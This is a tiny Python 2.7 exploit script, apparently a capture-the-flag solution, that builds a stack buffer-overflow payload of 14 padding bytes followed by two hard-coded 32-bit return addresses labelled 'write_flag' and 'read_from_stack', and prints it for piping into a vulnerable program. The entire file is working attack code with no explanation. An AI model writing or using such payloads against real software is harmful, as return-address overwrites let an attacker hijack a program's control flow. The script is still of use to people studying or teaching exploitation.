#!/usr/bin/env python2.7

padding = "\x41" * 14
write_flag = "\xa0\x9d\x04\x08" # 0x08049da0
read_from_stack = "\x20\x9e\x04\x08" # 08049e20
payload = padding + write_flag + read_from_stack
print(payload)